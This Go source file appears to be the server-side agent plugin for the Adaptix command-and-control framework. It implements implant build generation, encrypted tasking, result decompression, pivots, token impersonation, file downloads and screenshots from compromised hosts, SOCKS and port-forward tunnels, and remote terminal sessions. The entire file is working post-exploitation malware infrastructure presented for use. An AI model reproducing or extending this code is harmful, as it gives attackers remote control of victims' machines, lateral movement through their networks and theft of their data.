package main

import (
	"bytes"
	"compress/flate"
	"encoding/hex"
	"encoding/json"
	"io"
	"math/rand"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

const (
	OS_UNKNOWN = 0
	OS_WINDOWS = 1
	OS_LINUX   = 2
	OS_MAC     = 3

	TYPE_TASK       = 1
	TYPE_BROWSER    = 2
	TYPE_JOB        = 3
	TYPE_TUNNEL     = 4
	TYPE_PROXY_DATA = 5

	MESSAGE_INFO    = 5
	MESSAGE_ERROR   = 6
	MESSAGE_SUCCESS = 7

	DOWNLOAD_STATE_RUNNING  = 1
	DOWNLOAD_STATE_STOPPED  = 2
	DOWNLOAD_STATE_FINISHED = 3
	DOWNLOAD_STATE_CANCELED = 4
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentSetImpersonate(agentId string, impersonated string, elevated bool) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
	TsAgentConsoleOutputClient(agentId string, client string, messageType int, message string, clearText string)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisks(taskData adaptix.TaskData, jsonDrives string)
	TsClientGuiFiles(taskData adaptix.TaskData, path string, jsonFiles string)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiProcess(taskData adaptix.TaskData, jsonFiles string)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateWsSocks5(AgentId string, Info string, Lhost string, Lport int) (string, string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)

	TsGetBofFile(bofPath string) ([]byte, error)
}

type ModuleExtender struct {
	ts Teamserver
}

var (
	ModuleObject   *ModuleExtender
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) any {
	ModuleDir = moduleDir
	AgentWatermark = watermark

	ModuleObject = &ModuleExtender{
		ts: ts.(Teamserver),
	}
	return ModuleObject
}

func (m *ModuleExtender) AgentGenerate(config string, listenerWM string, listenerProfile []byte) ([]byte, string, error) {
	var (
		listenerMap  map[string]any
		agentProfile []byte
		err          error
	)

	err = json.Unmarshal(listenerProfile, &listenerMap)
	if err != nil {
		return nil, "", err
	}

	agentProfile, err = AgentGenerateProfile(config, listenerWM, listenerMap)
	if err != nil {
		return nil, "", err
	}

	return AgentGenerateBuild(config, agentProfile, listenerMap)
}

func (m *ModuleExtender) AgentCreate(beat []byte) (adaptix.AgentData, error) {
	return CreateAgent(beat)
}

func (m *ModuleExtender) AgentCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	return CreateTask(m.ts, agentData, args)
}

func (m *ModuleExtender) AgentPackData(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	packedData, err := PackTasks(agentData, tasks)
	if err != nil {
		return nil, err
	}

	return AgentEncryptData(packedData, agentData.SessionKey)
}

func (m *ModuleExtender) AgentPivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	packData, err := PackPivotTasks(pivotId, data)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)
	uid := hex.EncodeToString(randomBytes)[:8]

	taskData := adaptix.TaskData{
		TaskId: uid,
		Type:   TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentProcessData(agentData adaptix.AgentData, packedData []byte) ([]byte, error) {
	decryptData, err := AgentDecryptData(packedData, agentData.SessionKey)
	if err != nil {
		return nil, err
	}

	var plain []byte

	// 优先尝试按新会话层格式 [flags][orig_len_le][payload] 解析；
	// 若校验失败，则回退到旧格式（整个 decryptData 直接交给 ProcessTasksResult）。
	if len(decryptData) >= 5 {
		flags := decryptData[0]
		origLen := int(decryptData[1]) |
			int(decryptData[2])<<8 |
			int(decryptData[3])<<16 |
			int(decryptData[4])<<24

		if origLen > 0 {
			payload := decryptData[5:]

			if (flags & 0x1) != 0 {
				// 压缩路径：用 flate 解压
				r := flate.NewReader(bytes.NewReader(payload))
				if r != nil {
					var buf bytes.Buffer
					_, err = io.Copy(&buf, r)
					_ = r.Close()
					if err == nil && buf.Len() == origLen {
						plain = buf.Bytes()
					}
				}
			} else {
				// 未压缩路径：payload 长度必须与 origLen 一致
				if len(payload) == origLen {
					plain = payload
				}
			}
		}
	}

	// 若未能成功按新会话头解析（plain 仍为 nil），则按旧格式处理：
	// 直接将整个 decryptData 视为上层 payload，保持与 HTTP/TCP/SMB 旧行为兼容。
	if plain == nil {
		plain = decryptData
	}

	taskData := adaptix.TaskData{
		Type:        TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	resultTasks := ProcessTasksResult(m.ts, agentData, taskData, plain)

	for _, task := range resultTasks {
		m.ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil, nil
}

/// SYNC

func SyncBrowserDisks(ts Teamserver, taskData adaptix.TaskData, drivesSlice []adaptix.ListingDrivesDataWin) {
	jsonDrives, err := json.Marshal(drivesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiDisks(taskData, string(jsonDrives))
}

func SyncBrowserFiles(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileDataWin) {
	jsonDrives, err := json.Marshal(filesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiFiles(taskData, path, string(jsonDrives))
}

func SyncBrowserFilesStatus(ts Teamserver, taskData adaptix.TaskData) {
	ts.TsClientGuiFilesStatus(taskData)
}

func SyncBrowserProcess(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessDataWin) {
	jsonProcess, err := json.Marshal(processlist)
	if err != nil {
		return
	}

	ts.TsClientGuiProcess(taskData, string(jsonProcess))
}

/// TUNNEL

func (m *ModuleExtender) AgentTunnelCallbacks() (func(channelId int, address string, port int) adaptix.TaskData, func(channelId int, address string, port int) adaptix.TaskData, func(channelId int, data []byte) adaptix.TaskData, func(channelId int, data []byte) adaptix.TaskData, func(channelId int) adaptix.TaskData, func(tunnelId int, port int) adaptix.TaskData, error) {
	return TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose, TunnelMessageReverse, nil
}

func TunnelMessageConnectTCP(channelId int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateTCP(channelId, address, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageConnectUDP(channelId int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateUDP(channelId, address, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteTCP(channelId, data)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteUDP(channelId, data)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	packData, _ := TunnelClose(channelId)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	packData, _ := TunnelReverse(tunnelId, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

/// TERMINAL

func (m *ModuleExtender) AgentTerminalCallbacks() (func(int, string, int, int) (adaptix.TaskData, error), func(int, []byte) (adaptix.TaskData, error), func(int) (adaptix.TaskData, error), error) {
	return TerminalMessageStart, TerminalMessageWrite, TerminalMessageClose, nil
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int) (adaptix.TaskData, error) {
	packData, err := TerminalStart(terminalId, program, sizeH, sizeW)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func TerminalMessageWrite(channelId int, data []byte) (adaptix.TaskData, error) {
	packData, err := TerminalWrite(channelId, data)
	if err != nil {
		return adaptix.TaskData{}, err
	}
	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func TerminalMessageClose(terminalId int) (adaptix.TaskData, error) {
	packData, err := TerminalClose(terminalId)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}
